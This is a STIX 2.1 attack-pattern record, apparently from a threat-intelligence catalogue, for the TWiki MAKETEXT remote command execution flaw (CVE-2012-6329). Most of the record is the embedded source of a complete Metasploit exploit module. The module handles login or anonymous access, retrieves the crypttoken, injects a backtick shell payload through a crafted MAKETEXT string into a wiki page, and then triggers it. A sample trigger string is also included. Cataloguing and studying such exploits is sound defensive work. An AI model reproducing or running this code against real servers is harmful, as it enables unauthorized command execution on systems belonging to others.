{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd3db345-c451-4b50-992a-54a433c6f803",
    "created": "2024-08-14T17:13:06.865385Z",
    "modified": "2024-08-14T17:13:06.865389Z",
    "name": "TWiki MAKETEXT Remote Command Execution",
    "description": " This module exploits a vulnerability in the MAKETEXT Twiki variable. By using a specially crafted MAKETEXT, a malicious user can execute shell commands since user input is passed to the Perl \"eval\" command without first being sanitized. The problem is caused by an underlying security issue in the CPAN:Locale::Maketext module. This works in TWiki sites that have user interface localization enabled (UserInterfaceInternationalisation variable set).  If USERNAME and PASSWORD aren't provided, anonymous access will be tried. Also if the 'TwikiPage' option isn't provided, the module will try to create a random page on the SandBox space.  The module has been tested successfully on TWiki 5.1.2 as distributed with the official TWiki-VM-5.1.2-1 virtual machine. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/twiki_maketext.rb",
            "external_id": "twiki_maketext.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6329"
        },
        {
            "source_name": "reference",
            "url": "http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2012-6329"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TWiki MAKETEXT Remote Command Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in the MAKETEXT Twiki variable. By using a\n        specially crafted MAKETEXT, a malicious user can execute shell commands since user\n        input is passed to the Perl \"eval\" command without first being sanitized. The\n        problem is caused by an underlying security issue in the CPAN:Locale::Maketext\n        module. This works in TWiki sites that have user interface localization enabled\n        (UserInterfaceInternationalisation variable set).\n\n        If USERNAME and PASSWORD aren't provided, anonymous access will be tried. Also,\n        if the 'TwikiPage' option isn't provided, the module will try to create a random\n        page on the SandBox space.  The module has been tested successfully on\n        TWiki 5.1.2 as distributed with the official TWiki-VM-5.1.2-1 virtual machine.\n      },\n      'Author'         =>\n        [\n          'George Clark', # original discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-6329' ],\n          [ 'OSVDB', '88460' ],\n          [ 'BID', '56950' ],\n          [ 'URL', 'http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2012-6329' ]\n        ],\n      'Privileged'     => false, # web server context\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic ruby python telnet'\n            }\n        },\n      'Platform'       => [ 'unix' ],\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2012-12-15',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"TWiki base path\", \"/\" ]),\n        OptString.new('TwikiPage', [ false, \"TWiki Page with edit permissions to inject the payload, by default random Page on Sandbox (Ex: /Sandbox/MsfTest)\" ]),\n        OptString.new('USERNAME', [ false,  \"The user to authenticate as (anonymous if username not provided)\"]),\n        OptString.new('PASSWORD', [ false,  \"The password to authenticate with (anonymous if password not provided)\" ])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def do_login(username, password)\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => \"#{@base}do/login\",\n      'vars_post' =>\n        {\n          'username' => username,\n          'password' => password\n        }\n      })\n\n    if not res or res.code != 302 or res.get_cookies !~ /TWIKISID=([0-9a-f]*)/\n      return nil\n    end\n\n    session = $1\n    return session\n  end\n\n  def inject_code(session, code)\n\n    vprint_status(\"Retrieving the crypttoken...\")\n\n    res = send_request_cgi({\n      'uri'      => \"#{@base}do/edit#{@page}\",\n      'cookie'   => \"TWIKISID=#{session}\",\n      'vars_get' =>\n        {\n          'nowysiwyg' => '1'\n        }\n    })\n\n    if not res or res.code != 200 or res.body !~ /name=\"crypttoken\" value=\"([0-9a-f]*)\"/\n      vprint_error(\"Error retrieving the crypttoken\")\n      return nil\n    end\n\n    crypttoken = $1\n    vprint_good(\"crypttoken found: #{crypttoken}\")\n\n    if session.empty?\n      if res.get_cookies =~ /TWIKISID=([0-9a-f]*)/\n        session = $1\n      else\n        vprint_error(\"Error using anonymous access\")\n        return nil\n      end\n    end\n\n    vprint_status(\"Injecting the payload...\")\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => \"#{@base}do/save#{@page}\",\n      'cookie'   => \"TWIKISID=#{session}\",\n      'vars_post' =>\n      {\n        'crypttoken' => crypttoken,\n        'text' => \"#{rand_text_alpha(3 + rand(3))} %MAKETEXT{\\\"#{rand_text_alpha(3 + rand(3))} [_1] #{rand_text_alpha(3 + rand(3))}\\\\\\\\'}; `#{code}`; { #\\\" args=\\\"#{rand_text_alpha(3 + rand(3))}\\\"}%\"\n      }\n    })\n\n    if not res or res.code != 302 or res.headers['Location'] =~ /oops/ or res.headers['Location'] !~ /#{@page}/\n      print_warning(\"Error injecting the payload\")\n      print_status \"#{res.code}\\n#{res.body}\\n#{res.headers['Location']}\"\n      return nil\n    end\n\n    location = URI(res.headers['Location']).path\n    print_good(\"Payload injected on #{location}\")\n\n    return location\n  end\n\n  def check\n    @base = target_uri.path\n    @base << '/' if @base[-1, 1] != '/'\n\n    res = send_request_cgi({\n      'uri'      => \"#{@base}do/view/TWiki/WebHome\"\n    })\n\n    if not res or res.code != 200\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.body =~ /This site is running TWiki version.*TWiki-(\\d\\.\\d\\.\\d)/\n      version = $1\n      vprint_status(\"Version found: #{version}\")\n      if version < \"5.1.3\"\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Detected\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n\n    # Init variables\n    @page = ''\n\n    if datastore['TwikiPage'] and not datastore['TwikiPage'].empty?\n      @page << '/' if datastore['TwikiPage'][0] != '/'\n      @page << datastore['TwikiPage']\n    else\n      @page << \"/Sandbox/#{rand_text_alpha_lower(3).capitalize}#{rand_text_alpha_lower(3).capitalize}\"\n    end\n\n    @base = target_uri.path\n    @base << '/' if @base[-1, 1] != '/'\n\n    # Login if needed\n    if (datastore['USERNAME'] and\n      not datastore['USERNAME'].empty? and\n      datastore['PASSWORD'] and\n      not datastore['PASSWORD'].empty?)\n      print_status(\"Trying login to get session ID...\")\n      session = do_login(datastore['USERNAME'], datastore['PASSWORD'])\n    else\n      print_status(\"Using anonymous access...\")\n      session = \"\"\n    end\n\n    if not session\n      fail_with(Failure::Unknown, \"Error getting a session ID\")\n    end\n\n    # Inject payload\n    print_status(\"Trying to inject the payload on #{@page}...\")\n    res = inject_code(session, payload.encoded)\n    if not res\n      fail_with(Failure::Unknown, \"Error injecting the payload\")\n    end\n\n    # Execute payload\n    print_status(\"Executing the payload through #{res}...\")\n    res = send_request_cgi({\n      'uri'      => res,\n      'cookie'   => \"TWIKISID=#{session}\"\n    })\n    if not res or res.code != 200 or res.body !~ /HASH/\n      fail_with(Failure::Unknown, \"Error executing the payload\")\n    end\n\n    print_good(\"Exploitation was successful\")\n\n  end\nend\n\n=begin\n\n* Trigger:\n\n%MAKETEXT{\"test [_1] secondtest\\\\'}; `touch /tmp/msf.txt`; { #\" args=\"msf\"}%\n\n=end\n",
    "x_mitre_disclosure_date": "2012-12-15",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}